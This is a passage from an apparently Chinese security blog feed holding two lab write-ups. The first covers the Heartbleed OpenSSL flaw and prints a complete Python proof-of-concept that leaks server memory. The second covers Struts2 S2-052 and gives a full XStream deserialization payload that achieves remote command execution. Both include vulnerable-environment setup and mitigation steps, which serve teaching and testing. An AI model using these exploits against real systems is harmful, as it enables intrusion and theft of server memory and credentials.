class="hljs-regexp">/include/</span>openssl<br>ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openssl/</span>lib<span class="hljs-regexp">/libcrypto.so.1.0.0 /</span>lib/libcrypto.so.<span class="hljs-number">6</span><br>echo <span class="hljs-string">&quot;/usr/local/openssl/lib&quot;</span> &gt;&gt;<span class="hljs-regexp">/etc/</span>ld.so.conf <br>ldconfig -v<br></code></pre></td></tr></table></figure><p>执行：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openssl/</span>bin/openssl<br></code></pre></td></tr></table></figure><p>会出现类似如下信息：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed01.png"><br>测试新版本的OpenSSL是否正常工作</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">openssl<br>OpenSSL&gt; <span class="hljs-built_in">version</span> -<span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed02.png">  </p><p>此时，openssl安装完毕。  </p><h2 id="0x04-apache编译安装"><a href="#0x04-apache编译安装" class="headerlink" title="0x04 apache编译安装"></a>0x04 apache编译安装</h2><p>如果用之前yum安装的apache，用nmap扫描heartbleed漏洞仍然会是没有漏洞的版本，所以我们要重新编译安装apache并链接到我们的openssl1.0.1f版本。  </p><p>方法如下：  </p><p>下载apache源码进行编译安装，并且要安装依赖arp 和arp-util :<br>下载过程不再赘述<br>arp安装:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>apr<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>arp-util安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>apr<span class="hljs-regexp">/util --with-apr=/u</span>sr<span class="hljs-regexp">/local/</span>apr<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>apache安装，并配置到arp和arp-util和1.0.1f的openssl版本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>httpd --enable-so --enable-rewrite --enable-ssl --with-ssl=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openssl --with-apr=/u</span>sr<span class="hljs-regexp">/local/</span>apr --with-apr-util=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apr/u</span>til<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>此时apache重装完毕。  </p><h2 id="0x05-apache和openssl配置"><a href="#0x05-apache和openssl配置" class="headerlink" title="0x05 apache和openssl配置"></a>0x05 apache和openssl配置</h2><p>首先安装依赖包：mod_ssl  </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> mod_ssl<br></code></pre></td></tr></table></figure><p>在安装目录下的httpd.conf中添加ssl支持（注意这里是刚安装的apache目录，不要去配置原来的apache）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">LoadModule</span></span> ssl_module    modules/mod_ssl.so<br></code></pre></td></tr></table></figure><p>并启动重定向（同样在httpd.conf）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteEngine</span></span> <span class="hljs-literal">on</span><br><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteCond</span></span> <span class="hljs-variable">%&#123;SERVER_PORT&#125;</span> !^<span class="hljs-number">443</span>$<br><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> ^/?(.*)$ https://<span class="hljs-variable">%&#123;SERVER_NAME&#125;</span>/$<span class="hljs-number">1</span><span class="hljs-meta"> [L,R]</span><br></code></pre></td></tr></table></figure><p>利用openssl生成证书并修改Apache配置，实现https访问  </p><p>（1）生成私钥(key文件):  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> genrsa -des<span class="hljs-number">3</span> -out server.key <span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure><p>去除key文件口令:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">openssl rsa -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.key<br></code></pre></td></tr></table></figure><p>（2）生成Certificate Signing Request（CSR）</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.csr<br></code></pre></td></tr></table></figure><p>依照其指示一步一步输入要求的个人信息即可<br>（3）建立服务器密钥请求文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -x509 -keyout <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt<br></code></pre></td></tr></table></figure><p>（4）建立服务器证书  </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">openssl <span class="hljs-keyword">server</span>.crt -req -signkey <span class="hljs-keyword">server</span>.key -days <span class="hljs-number">365</span><br></code></pre></td></tr></table></figure><p>（5）将刚才生成的几个文件放在任意文件夹，然后vi编辑ssl.conf：</p><p>将SSLCertificateFile和SSLCertificateKeyFile设置对应到这个路径的相应文件：  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed03.png">  </p><p>（6）重启apache，然后通过宿主机访问虚拟机ip，发现被自动定向到443端口:<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed04.png">  </p><p>ps：<br>apache启动方法：<br>在apache安装路径/usr/local/httpd/bin  中输入./apachectl start启动apache</p><p>此时，环境搭建完毕。  </p><h2 id="0x06-使用poc攻击"><a href="#0x06-使用poc攻击" class="headerlink" title="0x06 使用poc攻击"></a>0x06 使用poc攻击</h2><p>用nmap -sV localhost –script=ssl-heartbleed测试漏洞环境  </p><p>结果如下，发现心脏出血漏洞：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed05.png">  </p><p>然后利用poc进行攻击<br>网上查到的python版poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python">执行命令如： python heartbleed.py <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> -p <span class="hljs-number">443</span><br><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> optparse <span class="hljs-keyword">import</span> OptionParser<br><br>options = OptionParser(usage=<span class="hljs-string">&#x27;%prog server [options]&#x27;</span>, description=<span class="hljs-string">&#x27;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#x27;</span>)<br>options.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>, default=<span class="hljs-number">443</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;TCP port to test (default: 443)&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">h2bin</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> x.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><br>hello = h2bin(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">16 03 02 00  dc 01 00 00 d8 03 02 53</span><br><span class="hljs-string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span><br><span class="hljs-string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span><br><span class="hljs-string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span><br><span class="hljs-string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span><br><span class="hljs-string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span><br><span class="hljs-string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span><br><span class="hljs-string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span><br><span class="hljs-string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span><br><span class="hljs-string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span><br><span class="hljs-string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span><br><span class="hljs-string">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span><br><span class="hljs-string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span><br><span class="hljs-string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span><br><span class="hljs-string">00 0f 00 01 01                                  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>hb = h2bin(<span class="hljs-string">&#x27;&#x27;&#x27; </span><br><span class="hljs-string">18 03 02 00 03</span><br><span class="hljs-string">01 40 00</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hexdump</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s), <span class="hljs-number">16</span>):<br>        lin = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s[b : b + <span class="hljs-number">16</span>]]<br>        hxdat = <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-string">&#x27;%02X&#x27;</span> % <span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> lin)<br>        pdat = <span class="hljs-string">&#x27;&#x27;</span>.join((c <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= <span class="hljs-built_in">ord</span>(c) &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;.&#x27;</span> )<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> lin)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  %04x: %-48s %s&#x27;</span> % (b, hxdat, pdat)<br>    <span class="hljs-built_in">print</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recvall</span>(<span class="hljs-params">s, length, timeout=<span class="hljs-number">5</span></span>):</span><br>    endtime = time.time() + timeout<br>    rdata = <span class="hljs-string">&#x27;&#x27;</span><br>    remain = length<br>    <span class="hljs-keyword">while</span> remain &gt; <span class="hljs-number">0</span>:<br>        rtime = endtime - time.time() <br>        <span class="hljs-keyword">if</span> rtime &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        r, w, e = select.select([s], [], [], <span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> r:<br>            data = s.recv(remain)<br>            <span class="hljs-comment"># EOF?</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>            rdata += data<br>            remain -= <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">return</span> rdata<br>        <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recvmsg</span>(<span class="hljs-params">s</span>):</span><br>    hdr = recvall(s, <span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">if</span> hdr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Unexpected EOF receiving record header - server closed connection&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    typ, ver, ln = struct.unpack(<span class="hljs-string">&#x27;&gt;BHH&#x27;</span>, hdr)<br>    pay = recvall(s, ln, <span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">if</span> pay <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Unexpected EOF receiving record payload - server closed connection&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27; ... received message: type = %d, ver = %04x, length = %d&#x27;</span> % (typ, ver, <span class="hljs-built_in">len</span>(pay))<br>    <span class="hljs-keyword">return</span> typ, ver, pay<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hit_hb</span>(<span class="hljs-params">s</span>):</span><br>    s.send(hb)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        typ, ver, pay = recvmsg(s)<br>        <span class="hljs-keyword">if</span> typ <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;No heartbeat response received, server likely not vulnerable&#x27;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">if</span> typ == <span class="hljs-number">24</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Received heartbeat response:&#x27;</span><br>            hexdump(pay)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pay) &gt; <span class="hljs-number">3</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;WARNING: server returned more data than it should - server is vulnerable!&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>        <span class="hljs-keyword">if</span> typ == <span class="hljs-number">21</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Received alert:&#x27;</span><br>            hexdump(pay)<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Server returned error, likely not vulnerable&#x27;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    opts, args = options.parse_args()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) &lt; <span class="hljs-number">1</span>:<br>        options.print_help()<br>        <span class="hljs-keyword">return</span><br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Connecting...&#x27;</span><br>    sys.stdout.flush()<br>    s.connect((args[<span class="hljs-number">0</span>], opts.port))<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Sending Client Hello...&#x27;</span><br>    sys.stdout.flush()<br>    s.send(hello)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Waiting for Server Hello...&#x27;</span><br>    sys.stdout.flush()<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        typ, ver, pay = recvmsg(s)<br>        <span class="hljs-keyword">if</span> typ == <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Server closed connection without sending Server Hello.&#x27;</span><br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># Look for server hello done message.</span><br>        <span class="hljs-keyword">if</span> typ == <span class="hljs-number">22</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(pay[<span class="hljs-number">0</span>]) == <span class="hljs-number">0x0E</span>:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Sending heartbeat request...&#x27;</span><br>    sys.stdout.flush()<br>    s.send(hb)<br>    hit_hb(s)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>进行攻击，成功获得内存的数据  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed06.png">  </p><p>通过wireshark抓包，我们发现Heartbeat Response回复了大约16kb的内存数据。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed07.png"></p><h2 id="0x07-使用openvas对该存在漏洞的系统扫描"><a href="#0x07-使用openvas对该存在漏洞的系统扫描" class="headerlink" title="0x07 使用openvas对该存在漏洞的系统扫描"></a>0x07 使用openvas对该存在漏洞的系统扫描</h2><p>结果如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed08.png"><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/heardbleed/heartbleed09.png">  </p><h2 id="0x08-应对方案"><a href="#0x08-应对方案" class="headerlink" title="0x08 应对方案"></a>0x08 应对方案</h2><p>升级openssl版本</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>heartbleed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>struts2-052漏洞</title>
    <link href="/2018/01/22/struts2-052%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/01/22/struts2-052%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-struts2"><a href="#0x00-struts2" class="headerlink" title="0x00 struts2"></a>0x00 struts2</h2><p>struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。  </p><h2 id="0x01-struts2-052漏洞"><a href="#0x01-struts2-052漏洞" class="headerlink" title="0x01 struts2-052漏洞"></a>0x01 struts2-052漏洞</h2><p>struts2-052漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞，构成远程代码执行。  </p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>这次漏洞使用windows系统做测试对象。  </p><p>下载java并配置环境:  </p><ul><li><p>在java官网下载java1.8  </p></li><li><p>然后添加到windows环境变量<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts1.png">  </p></li></ul><p>下载tomcat并配置环境：  </p><ul><li>在tomcat官网下载tomcat并解压  </li><li>然后添加到windows环境变量  </li></ul><p>下载存在漏洞的struts2框架版本：  </p><p>在 <a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a> 下载漏洞影响的最后版本2.5.12<br>解压后将struts2-rest-showcase.war复制到tomcat的webapps的目录下  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts2.png">  </p><p>更改/tomcat/conf中的server.xml，默认是8080，如果冲突我们可以将端口号更改到空闲端口，这里改到了12345  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts3.png">  </p><p>打开/tomcat/bin中的startup.bat，并通过浏览器访问页面。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts4.png">  </p><h2 id="0x03-payload生成"><a href="#0x03-payload生成" class="headerlink" title="0x03 payload生成"></a>0x03 payload生成</h2><p>若本机拥有git环境，则使用<br>git clone <a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a><br>然后参考 <a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a> 中的使用方法<br>来生成payload<br>如果没有，可以在网络中查找一段windows的payload，并将此段代码中command标签中的内容更改成想在cmd中执行的命令，这里使用了calc</p><pre><code>&lt;map&gt;  &lt;entry&gt;    &lt;jdk.nashorn.internal.objects.NativeString&gt;      &lt;flags&gt;0&lt;/flags&gt;      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;        &lt;dataHandler&gt;          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;                &lt;initialized&gt;false&lt;/initialized&gt;                &lt;opmode&gt;0&lt;/opmode&gt;                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                      &lt;command&gt;                        &lt;string&gt;calc&lt;/string&gt;                      &lt;/command&gt;                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                    &lt;/next&gt;                  &lt;/iter&gt;                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                    &lt;method&gt;                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                      &lt;name&gt;start&lt;/name&gt;                      &lt;parameter-types/&gt;                    &lt;/method&gt;                    &lt;name&gt;foo&lt;/name&gt;                  &lt;/filter&gt;                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;                &lt;/serviceIterator&gt;                &lt;lock/&gt;              &lt;/cipher&gt;              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;              &lt;ibuffer&gt;&lt;/ibuffer&gt;              &lt;done&gt;false&lt;/done&gt;              &lt;ostart&gt;0&lt;/ostart&gt;              &lt;ofinish&gt;0&lt;/ofinish&gt;              &lt;closed&gt;false&lt;/closed&gt;            &lt;/is&gt;            &lt;consumed&gt;false&lt;/consumed&gt;          &lt;/dataSource&gt;          &lt;transferFlavors/&gt;        &lt;/dataHandler&gt;        &lt;dataLen&gt;0&lt;/dataLen&gt;      &lt;/value&gt;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;  &lt;/entry&gt;  &lt;entry&gt;    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;  &lt;/entry&gt;&lt;/map&gt;</code></pre><p>具体构造命令时，某些字符无法直接输入，关于这部分的构造方法在 <a href="http://www.freebuf.com/vuls/147017.html">http://www.freebuf.com/vuls/147017.html</a>  </p><h2 id="0x04-使用burpsuite进行截包重发"><a href="#0x04-使用burpsuite进行截包重发" class="headerlink" title="0x04 使用burpsuite进行截包重发"></a>0x04 使用burpsuite进行截包重发</h2><p>将burpsuite中的监听设置成127.0.0.1:8082  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts5.png">  </p><p>将浏览器的代理设置成手动代理，ip和端口号与burpsuite中设置相同  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts6.png">  </p><p>然后用浏览器访问 <a href="http://localhost:12345/struts2-rest-showcase">http://localhost:12345/struts2-rest-showcase</a>  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts7.png">  </p><p>然后利用brupsuite截断一次提交的数据  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts8.png">  </p><p>将content-type改成application/xml，将body部分数据改为之前写好的payload  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts9.png">  </p><p>然后提交，成功弹出本机计算器  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts10.png">  </p><h2 id="0x05-使用openvas对该存在漏洞的系统进行扫描"><a href="#0x05-使用openvas对该存在漏洞的系统进行扫描" class="headerlink" title="0x05 使用openvas对该存在漏洞的系统进行扫描"></a>0x05 使用openvas对该存在漏洞的系统进行扫描</h2><p>扫描结果如下:  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts11.png">  </p><h2 id="0x06-危害"><a href="#0x06-危害" class="headerlink" title="0x06 危害"></a>0x06 危害</h2><p>入侵者可以直接通过提交数据包对服务器进行操作，可以远程执行代码随意查看服务器内容，还可以通过命令写入木马、创建用户、留下后门。  </p><h2 id="0x07-应对方案"><a href="#0x07-应对方案" class="headerlink" title="0x07 应对方案"></a>0x07 应对方案</h2><ul><li>升级Struts到2.5.13最新版本</li><li>在不使用时删除Struts REST插件</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>struts2-052</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
